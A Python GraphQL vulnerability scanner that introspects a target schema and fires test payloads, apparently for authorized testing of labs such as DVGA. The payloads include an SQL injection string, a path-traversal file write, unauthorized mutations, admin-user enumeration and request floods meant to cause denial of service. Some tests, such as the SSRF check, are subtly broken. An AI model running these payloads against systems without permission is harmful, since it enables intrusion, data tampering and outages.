import requests
import json

# Define the GraphQL endpoint URL
def load_endpoints(filename):
    with open(filename, "r") as file:
        for line in file:
            yield json.loads(line)['url']

def save_results(details, test_name, status, response_data, query, filename="vulnerabilities.json"):
    """Appends detailed test results to a specified results file, including the query used."""
    with open(filename, 'a') as file:
        entry = {
            test_name: {
                "status": status,
                "details": details,
                "query": query,
                "response": response_data
            }
        }
        file.write(json.dumps(entry, indent=4) + "\n")

def get_headers(auth_token=None):
    """ Returns HTTP headers suitable for making requests. """
    headers = {'Content-Type': 'application/json'}
    if auth_token:
        headers['Authorization'] = f'Bearer {auth_token}'
    return headers

def test_excessive_resource_requests(url, auth_token=None, schema=None, results_filename="vulnerabilities.json"):
    """Dynamically tests for excessive resource request vulnerabilities based on schema."""
    if not schema:
        schema = fetch_schema(url, auth_token)

    details = {
        "vulnerability": "Excessive Resource Request",
        "severity": "Medium",
        "description": "Occurs when a GraphQL query allows requesting an excessive amount or depth of resources without adequate restrictions, potentially leading to performance degradation or DoS.",
        "remediation": "Implement depth limiting, complexity analysis, and enforce pagination to prevent abuse."
    }

    vulnerability_found = False

    for type_info in schema:
        if type_info.get('fields'):
            fields = ' '.join([field['name'] for field in type_info['fields']])
            query = f"{{ {type_info['name']} {{ {fields} }} }}"
            try:
                response = requests.post(url, json={"query": query}, headers=get_headers(auth_token))
                response_data = response.json()
                if 'data' in response_data:
                    save_results(details, f"Excessive Resource Test on {type_info['name']}", "Test Passed", response_data, query, results_filename)
                    vulnerability_found = True
            except Exception as e:
                save_results(details, f"Excessive Resource Test on {type_info['name']}", "Error During Test", str(e), query, results_filename)

    if vulnerability_found:
        return "Excessive resource request vulnerability found."
    else:
        return "Excessive resource request vulnerability not found."

def test_dos_attack(url, auth_token=None, results_filename="vulnerabilities.json"):
    """Tests for Denial of Service vulnerability using repeated query submission."""
    query = "query { systemUpdate }" * 100
    details = {
        "vulnerability": "Denial of Service (DoS)",
        "severity": "High",
        "description": "This test floods the server with repeated requests to check if the server can handle high load without service degradation or crash.",
        "remediation": "Implement rate limiting, use a robust load balancer, and consider auto-scaling."
    }
    try:
        status_codes = []
        for i in range(100):
            response = requests.post(url, json={"query": query}, headers=get_headers(auth_token))
            status_codes.append(response.status_code)
        # Summarizing response status codes
        status_summary = {status: status_codes.count(status) for status in set(status_codes)}
        if 200 not in status_codes:
            save_results(details, "DoS Attack", "Vulnerability Found", status_summary, query, results_filename)
            return "DoS attack vulnerability found."
        else:
            save_results(details, "DoS Attack", "No Vulnerability Found", status_summary, query, results_filename)
            return "DoS attack vulnerability not found."
    except Exception as e:
        save_results(details, "DoS Attack", "Test Failed", str(e), query, results_filename)
        return "DoS attack test failed."

def test_alias_attack(url, auth_token=None, results_filename="vulnerabilities.json"):
    """Tests for vulnerability to alias-based attacks."""
    query_list = [f"q{i}: systemUpdate" for i in range(1)]
    query = "{" + " ".join(query_list) + "}"
    details = {
        "vulnerability": "Alias-Based Attack",
        "severity": "Medium",
        "description": "Tests if the server handles numerous query aliases without significant performance drop or errors.",
        "remediation": "Limit the number of allowed aliases in queries to prevent abuse."
    }
    try:
        status_codes = []
        responses = []
        for i in range(1):
            response = requests.post(url, json={"query": query}, headers=get_headers(auth_token))
            status_codes.append(response.status_code)
            responses.append(response.json())
        response_summary = {
            "status_codes": status_codes[:10],  
            "sample_responses": responses[:3]  
        }
        if 200 not in status_codes:
            save_results(details, "Alias-Based Attack", "Vulnerability Found", response_summary, query, results_filename)
            return "Alias-based attack vulnerability found."
        else:
            save_results(details, "Alias-Based Attack", "No Vulnerability Found", response_summary, query, results_filename)
            return "Alias-based attack vulnerability not found."
    except Exception as e:
        save_results(details, "Alias-Based Attack", "Test Failed", str(e), query, results_filename)
        return "Alias-based attack test failed."

def test_deep_recursion_attack(url, auth_token=None, results_filename="vulnerabilities.json"):
    """Tests the server's ability to handle deeply nested queries."""
    schema = fetch_schema(url, auth_token)
    details = {
        "vulnerability": "Deep Recursion Query",
        "severity": "Medium",
        "description": "Evaluates how the server copes with a deeply nested query, which could impact performance or lead to stack overflows.",
        "remediation": "Implement depth limiting on GraphQL queries to prevent deep recursion."
    }
    test_results = []

    for type_info in schema:
        if type_info.get('fields'):
            # Construct a deeply nested query
            nested_query = " ".join([f"{field['name']} {{ {field['name']} }}" for field in type_info['fields'] if field.get('type').get('fields')])
            query = f"{{ {type_info['name']} {{ {nested_query} }} }}"
            try:
                response = requests.post(url, json={"query": query}, headers=get_headers(auth_token))
                if response.status_code == 200:
                    test_results.append(f"Potential deep recursion vulnerability found in {type_info['name']}.")
                    save_results(details, f"Deep Recursion Test on {type_info['name']}", "Vulnerability Found", response.json(), query, results_filename)
                else:
                    test_results.append(f"No vulnerability found in {type_info['name']}.")
                    save_results(details, f"Deep Recursion Test on {type_info['name']}", "No Vulnerability Found", response.json(), query, results_filename)
            except Exception as e:
                test_results.append(f"Error testing {type_info['name']}: {str(e)}")
                save_results(details, f"Deep Recursion Test on {type_info['name']}", "Error During Test", str(e), query, results_filename)
    return "Potential vulnerability found" if any("Vulnerability Found" in result for result in test_results) else "No vulnerabilities found"

def test_ssrf_vulnerability(url, auth_token=None, results_filename="vulnerabilities.json"):
    """Tests for SSRF vulnerability."""
    schema = fetch_schema(url, auth_token)
    details = {
        "vulnerability": "Server-Side Request Forgery (SSRF)",
        "severity": "High",
        "description": "Occurs when an attacker can make the server perform malicious requests on their behalf, potentially accessing internal resources or performing actions on other systems.",
        "remediation": "Ensure that server-side code properly validates and sanitizes all user-supplied inputs, and restricts access to sensitive resources."
    }
    test_results = []

    for type_info in schema:
        if type_info.get('fields'):
            # Attempt to use a field to trigger an external request
            query = f"{{ {type_info['name']} {{ " + ' '.join(f"url" if f"name" == 'url' else f"{field['name']}" for field in type_info['fields']) + " }} }}"
            try:
                response = requests.post(url, json={"query": query}, headers=get_headers(auth_token))
                if response.status_code == 200:
                    test_results.append(f"Potential SSRF vulnerability found in {type_info['name']}.")
                    save_results(details, f"SSRF Vulnerability Test on {type_info['name']}", "Vulnerability Found", response.json(), query, results_filename)
                else:
                    test_results.append(f"No SSRF vulnerability found in {type_info['name']}.")
                    save_results(details, f"SSRF Vulnerability Test on {type_info['name']}", "No Vulnerability Found", response.json(), query, results_filename)
            except Exception as e:
                test_results.append(f"Error testing {type_info['name']}: {str(e)}")
                save_results(details, f"SSRF Vulnerability Test on {type_info['name']}", "Error During Test", str(e), query, results_filename)
    return "Potential vulnerability found" if any("Vulnerability Found" in result for result in test_results) else "No vulnerabilities found"

def test_sql_injection(url, auth_token=None, schema=None, results_filename="vulnerabilities.json"):
    if not schema:
        schema = fetch_schema(url, auth_token)
    if not schema:
        return "Failed to fetch schema or no schema available."

    details = {
        "vulnerability": "SQL Injection",
        "severity": "High",
        "description": "Allows attackers to execute arbitrary SQL queries on the server's database.",
        "remediation": "Use parameterized queries or prepared statements."
    }

    vulnerabilities_found = False

    for field in schema:
        if any(arg['type']['name'] == 'String' for arg in field.get('args', [])): 
            for arg in field['args']:
                injection_query = {
                    "query": f"""
                    query {{
                        {field['name']}({arg['name']}:"' OR ''='") {{
                            {arg['name']}
                        }}
                    }}
                    """
                }
                try:
                    response = requests.post(url, json=injection_query, headers=get_headers(auth_token))
                    response_json = response.json()
                    if response.status_code == 200 and 'errors' not in response_json:
                        save_results(details, f"SQL Injection Test on {field['name']} using {arg['name']}", "Vulnerability Found", response.status_code, injection_query["query"], results_filename)
                        vulnerabilities_found = True
                    else:
                        save_results(details, f"SQL Injection Test on {field['name']} using {arg['name']}", "No Vulnerability Found", response.status_code, injection_query["query"], results_filename)
                except Exception as e:
                    save_results(details, f"SQL Injection Test on {field['name']} using {arg['name']}", "Error During Test", str(e), injection_query["query"], results_filename)

    return "SQL injection vulnerabilities found." if vulnerabilities_found else "No SQL injection vulnerabilities found."


def test_path_traversal(url, auth_token=None, results_filename="vulnerabilities.json"):
    schema = fetch_schema_deeper(url, auth_token)
    if not schema:
        return "Failed to fetch schema or no schema available."

    details = {
        "vulnerability": "Path Traversal",
        "severity": "High",
        "description": "Test to identify if file operations allow navigation to parent directories, potentially accessing unauthorized files."
    }

    vulnerable = []
    headers = get_headers(auth_token)
    # Iterate over mutation fields in the schema
    for field in schema:
        if any(arg['name'] == 'filename' for arg in field.get('args', [])):  # Check if filename argument exists
            path_traversal_query = {
                "query": f"""
                mutation {{
                    {field['name']}(filename:"../../../../../tmp/file.txt", content:"test") {{
                        result
                    }}
                }}
                """
            }
            try:
                response = requests.post(url, json=path_traversal_query, headers=headers)
                if response.status_code == 200 and 'data' in response.json() and response.json()['data'].get(field['name'], {}).get('result'):
                    vulnerable.append(f"{field['name']} is vulnerable to path traversal.")
                    save_results(details, f"Path Traversal Test on {field['name']}", "Vulnerability Found", response.json(), path_traversal_query['query'], results_filename)
                else:
                    save_results(details, f"Path Traversal Test on {field['name']}", "No Vulnerability Found", response.json(), path_traversal_query['query'], results_filename)
            except Exception as e:
                vulnerable.append(f"Error testing {field['name']}: {str(e)}")
                save_results(details, f"Path Traversal Test on {field['name']}", "Error During Test", str(e), path_traversal_query['query'], results_filename)

    if vulnerable:
        return "Vulnerabilities detected: " + ", ".join(vulnerable)
    else:
        return "No path traversal vulnerabilities found."

def test_permissions(url, auth_token=None, schema=None, results_filename="vulnerabilities.json"):
    """Tests for authorization vulnerabilities by dynamically testing mutations based on schema introspection."""
    if not schema:
        schema = fetch_schema(url, auth_token)

    details = {
        "vulnerability": "Improper Authorization",
        "severity": "High",
        "description": "Occurs when mutations do not enforce proper authorization, allowing unauthorized modifications.",
        "remediation": "Implement and enforce strict authorization checks on all sensitive mutations."
    }

    test_results = []

    for mutation in schema:
        # Ensure mutation has 'args' and then check for 'userId' in args
        if 'args' in mutation and any(arg['name'] == 'userId' for arg in mutation['args']):
            mutation_query = f'''
            mutation {{
                {mutation['name']}(userId: "12345") {{
                    __typename
                }}
            }}
            '''
            try:
                response = requests.post(url, json={'query': mutation_query}, headers=get_headers(auth_token))
                if response.status_code in [403, 401]:
                    test_results.append(f"Proper authorization in place for '{mutation['name']}'.")
                    save_results(details, f"Authorization Test on {mutation['name']}", "No Vulnerability Found", response.json(), mutation_query, results_filename)
                else:
                    test_results.append(f"Authorization vulnerability detected in '{mutation['name']}'.")
                    save_results(details, f"Authorization Test on {mutation['name']}", "Vulnerability Found", response.json(), mutation_query, results_filename)
            except Exception as e:
                test_results.append(f"Error testing '{mutation['name']}': {str(e)}")
                save_results(details, f"Authorization Test on {mutation['name']}", "Error During Test", str(e), mutation_query, results_filename)

    return "Vulnerabilities detected." if any("Vulnerability Found" in result for result in test_results) else "No authorization vulnerabilities found."
    
def test_getUsers(url, auth_token=None, filename="vulnerabilities.json"):
    getUsers_query = {
        'query': '''
        query getUsers {
          users(where: {role: ADMINISTRATOR}) {
            edges {
              node {
                userId
                name
              }
            }
          }
        }
        '''
    }
    details = {
        "description": "Tests if user data for administrators can be fetched without proper authorization.",
        "severity": "High"
    }
    try:
        response = requests.post(url, json=getUsers_query, headers=get_headers(auth_token))
        response.raise_for_status()
        response_json = response.json()
        if 'data' in response_json and 'users' in response_json['data']:
            save_results(details, "Get Users Test", "Vulnerability Found", response_json, getUsers_query['query'], filename)
            return "Get users vulnerability found."
        else:
            save_results(details, "Get Users Test", "No Vulnerability Found", response_json, getUsers_query['query'], filename)
            return "Get users vulnerability not found."
    except Exception as e:
        save_results(details, "Get Users Test", "Test Not Applicable", str(e), getUsers_query['query'], filename)
        return f"Get users test not applicable."
    
def test_unauthorized_comment(url, auth_token=None):
    comment_query = {
        "query": """
            mutation {
                createComment(input: {
                    postId: 1,
                    userId: 1,
                    content: "This is a test comment.",
                    clientMutationId: "UWHATM8",
                }) {
                    clientMutationId
                }
            }
        """
    }
    try:
        response = requests.post(url, json=comment_query, headers=get_headers(auth_token))
        if response.status_code == 200 and 'UWHATM8' in response.text:
            return "Unauthorized comment vulnerability found."
        else:
            return "Unauthorized comment vulnerability not found."
    except Exception as e:
        return f"An error occurred while testing unauthorized comment: {str(e)}"
    


def test_batching_attack(url, auth_token=None, results_filename="vulnerabilities.json"):
    schema = fetch_schema(url, auth_token)
    if not schema:
        return "Failed to fetch schema or no schema available."

    details = {
        "vulnerability": "Batching Attack",
        "severity": "Medium",
        "description": "Test to identify if the API allows batching of queries which can be exploited to perform unauthorized operations or data retrieval."
    }

    # Prepare batch queries based on the schema
    batch_queries = []
    for field in schema:
        if 'type' in field and 'fields' in field['type']:
            subfields = ', '.join(sub['name'] for sub in field['type']['fields'])
            if subfields:  # Ensure there are subfields to construct a meaningful query
                query = f"{{ {field['name']} {{ {subfields} }} }}"
                batch_queries.append({'query': query})

    if not batch_queries:
        save_results(details, "Batching Attack Test", "No Suitable Fields for Batch Query", {}, "", results_filename)
        return "No suitable fields found for batching attack test."

    # Execute batch queries
    headers = get_headers(auth_token)
    try:
        response = requests.post(url, json=batch_queries, headers=headers)
        if response.status_code == 200 and "errors" not in response.json():
            save_results(details, "Batching Attack Test", "Vulnerability Found", response.json(), str(batch_queries), results_filename)
            return "Batching attack vulnerability found."
        else:
            save_results(details, "Batching Attack Test", "No Vulnerability Found", response.json(), str(batch_queries), results_filename)
            return "Batching attack vulnerability not found."
    except Exception as e:
        save_results(details, "Batching Attack Test", "Test Failed", str(e), str(batch_queries), results_filename)
        return f"Batching attack test failed: {str(e)}"


def test_unauthorized_mutation(url, auth_token=None):
    mutation_query = 'mutation { updatePost(id: "1", data: { title: "New Title" }) { title } }'
    try:
        response = requests.post(url, json={"query": mutation_query}, headers=get_headers(auth_token))
        if response.status_code in [200, 201] and 'title' in response.json().get('data', {}):
            return "Unauthorized mutation vulnerability found."
        else:
            return "Unauthorized mutation vulnerability not found."
    except Exception as e:
        return f"Mutation test failed: {str(e)}"


def test_sensitive_data_dynamically(url, schema, auth_token=None, results_filename="vulnerabilities.json"):
    """ Dynamically test for sensitive data based on schema introspection. """
    sensitive_keywords = [
        'password', 'passcode', 'passwd', 'pin', 'creditcard', 'ccnumber', 'cardnum', 'ssn', 'socialsecuritynumber',
        'secret', 'token', 'apikey', 'api_key', 'accesstoken', 'access_token', 'auth', 'authentication', 'credentials',
        'privatekey', 'private_key', 'secretkey', 'secret_key', 'encryptionkey', 'encryption_key',
        'bank', 'accountnumber', 'account_num', 'routingnumber', 'routing_num', 'financial',
        'salary', 'birthdate', 'birthplace', 'passportnumber', 'passport_num', 'driverlicense', 'driver_license_num',
        'address', 'email', 'phone', 'phonenumber', 'mobile', 'cell', 'contact', 'zip', 'postal', 'postcode',
        'signature', 'profile', 'ssn', 'dni', 'nationalid', 'national_id', 'taxid', 'tax_id', 'health', 'insurance',
        'beneficiary', 'beneficiary_id', 'custodian', 'guardian', 'sessionid', 'session_id', 'cookie', 'authentication_token'
    ]
    sensitive_fields = []
    findings = []

    for type_info in schema:
        if type_info.get('fields'):
            for field in type_info['fields']:
                if any(keyword in field['name'].lower() for keyword in sensitive_keywords):
                    sensitive_fields.append((type_info['name'], field['name']))

    for type_name, field_name in sensitive_fields:
        query = f'{{ {type_name} {{ {field_name} }} }}'
        response = requests.post(url, json={'query': query}, headers=get_headers(auth_token))
        result_detail = {
            "type": type_name,
            "field": field_name,
            "query": query,
            "status_code": response.status_code
        }
        if response.status_code == 200 and response.json().get('data', {}).get(type_name):
            findings.append("Vulnerability Found")
            save_results(result_detail, "Sensitive Data Test", "Data Leak Detected", response.json(), query, results_filename)
        else:
            findings.append("No Vulnerability Found")

    return "Vulnerability Found" if "Vulnerability Found" in findings else "No vulnerabilities found"


def test_dynamic_nested_query(url, schema, auth_token=None, results_filename="vulnerabilities.json"):
    findings = []
    for type_info in schema:
        if type_info.get('fields'):
            query_fields = []
            for field in type_info['fields']:
                if field['type']['kind'] == 'OBJECT':
                    nested_fields = ' '.join([nested_field['name'] for nested_field in field['type'].get('fields', []) if nested_field['type']['kind'] != 'OBJECT'])
                    if nested_fields:
                        query_fields.append(f"{field['name']} {{ {nested_fields} }}")
            if query_fields:
                full_query = f'{{ {type_info["name"]} {{ ' + ' '.join(query_fields) + ' }} }}'
                response = requests.post(url, json={'query': full_query}, headers=get_headers(auth_token))
                result_detail = {
                    "type_info": type_info["name"],
                    "query": full_query,
                    "status_code": response.status_code
                }
                if response.status_code != 200:
                    findings.append("Vulnerability Found")
                    save_results(result_detail, "Dynamic Nested Query Test", "Vulnerability Found", response.json(), full_query, results_filename)
                else:
                    findings.append("No Vulnerability Found")

    return "Vulnerability Found" if "Vulnerability Found" in findings else "No vulnerabilities found"


def test_dynamic_field_accessibility(url, schema, auth_token=None, results_filename="vulnerabilities.json"):
    restricted_keywords = ['admin', 'restricted', 'private', 'confidential']
    findings = []

    for type_info in schema:
        if type_info.get('fields'):
            for field in type_info['fields']:
                if any(keyword in field['name'].lower() for keyword in restricted_keywords):
                    query = f'{{ {type_info["name"]} {{ {field["name"]} }} }}'
                    response = requests.post(url, json={'query': query}, headers=get_headers(auth_token))
                    result_detail = {
                        "field": field['name'],
                        "type": type_info['name'],
                        "query": query,
                        "status_code": response.status_code
                    }
                    if response.status_code == 200 and response.json().get('data', {}).get(type_info['name']):
                        findings.append("Vulnerability Found")
                        save_results(result_detail, "Dynamic Field Accessibility Test", "Unauthorized Access Detected", response.json(), query, results_filename)
                    else:
                        findings.append("No Vulnerability Found")

    return "Vulnerability Found" if "Vulnerability Found" in findings else "No vulnerabilities found"


def test_dynamic_mutation(url, schema, auth_token=None, results_filename="vulnerabilities.json"):
    mutation_keywords = ['update', 'create', 'delete', 'add', 'remove', 'set']
    findings = []

    for type_info in schema:
        if type_info.get('fields'):
            for field in type_info['fields']:
                if 'mutation' in type_info['name'].lower() or any(keyword in field['name'].lower() for keyword in mutation_keywords):
                    mutation_query = f'mutation {{ {field["name"]}(input: {{}}) {{ id }} }}'
                    response = requests.post(url, json={'query': mutation_query}, headers=get_headers(auth_token))
                    result_detail = {
                        "field": field['name'],
                        "type": type_info['name'],
                        "query": mutation_query,
                        "status_code": response.status_code
                    }
                    if response.status_code == 200:
                        findings.append("Vulnerability Found")
                        save_results(result_detail, "Dynamic Mutation Test", "Mutation Possible", response.json(), mutation_query, results_filename)
                    else:
                        findings.append("No Vulnerability Found")

    return "Vulnerability Found" if "Vulnerability Found" in findings else "No vulnerabilities found"


def test_dynamic_subscription(url, schema, auth_token=None, results_filename="vulnerabilities.json"):
    """Tests GraphQL subscriptions for unauthorized access or data leakage issues."""
    findings = []
    for type_info in schema:
        if 'subscription' in type_info['name'].lower():
            for field in type_info['fields']:
                subscription_query = f'subscription {{ {field["name"]} {{ id }} }}'
                response = requests.post(url, json={'query': subscription_query}, headers=get_headers(auth_token))
                result_detail = {
                    "type": type_info['name'],
                    "field": field['name'],
                    "query": subscription_query,
                    "status_code": response.status_code
                }
                if response.status_code == 200:
                    findings.append("Vulnerability Found")
                    save_results(result_detail, "Subscription Test", "Potential Data Leakage", response.json(), subscription_query, results_filename)
                else:
                    findings.append("No Vulnerability Found")

    return "Vulnerability Found" if "Vulnerability Found" in findings else "No vulnerabilities found"


def test_denialOfService(url, auth_token=None):
    # 100 for both correctly tests DVGA without completely crashing
    # 10000 and 1000 correctly tests WP
    # 10000 and 1000 correctly tests Saleor
    FORCE_MULTIPLIER = 100
    CHAINED_REQUESTS = 100
    queries = []
    
    payload = 'content \n comments { \n nodes { \n content } }' * FORCE_MULTIPLIER
    query = {'query':'query { \n posts { \n nodes { \n ' + payload + '} } }'}
    
    for _ in range(0, CHAINED_REQUESTS):
        queries.append(query)

    r = requests.post(url, json=queries)
    if (r.status_code == 200):
        return "Denial of Service vulnerability not found. The server is still responsive."
    else:
        return "Denial of Service vulnerability found. The server may have crashed or become unresponsive."
    
def fetch_schema(url, auth_token=None):
    introspection_query = {
        "query": """
        query IntrospectionQuery {
            __schema {
                types {
                    name
                    fields {
                        name
                        type {
                            name
                            kind
                            ofType {
                                name
                                kind
                            }
                        }
                    }
                }
            }
        }
        """
    }
    headers = get_headers(auth_token)
    response = requests.post(url, json=introspection_query, headers=headers)
    if response.status_code == 200:
        schema_data = response.json()['data']['__schema']['types']
        return schema_data
    else:
        print(f"Failed to fetch schema: {response.status_code}")
        return None
    
def fetch_schema_deeper(url, auth_token=None):
    """ Fetch the GraphQL schema via introspection. """
    introspection_query = {
        "query": """
        query IntrospectionQuery {
            __schema {
                queryType {
                    name
                    fields {
                        name
                        type {
                            name
                            kind
                            ofType {
                                name
                                kind
                            }
                        }
                        args {
                            name
                            type {
                                name
                                kind
                                ofType {
                                    name
                                    kind
                                }
                            }
                        }
                    }
                }
                mutationType {
                    name
                    fields {
                        name
                        type {
                            name
                            kind
                            ofType {
                                name
                                kind
                            }
                        }
                        args {
                            name
                            type {
                                name
                                kind
                                ofType {
                                    name
                                    kind
                                }
                            }
                        }
                    }
                }
            }
        }
        """
    }
    headers = get_headers(auth_token)
    response = requests.post(url, json=introspection_query, headers=headers)
    if response.status_code == 200:
        schema_data = response.json()['data']['__schema']
        # Combine both query and mutation types into a single list
        schema = []
        if 'queryType' in schema_data:
            schema.extend(schema_data['queryType']['fields'])
        if 'mutationType' in schema_data and schema_data['mutationType']:
            schema.extend(schema_data['mutationType']['fields'])
        return schema
    else:
        print(f"Failed to fetch schema: {response.status_code}")
        return None
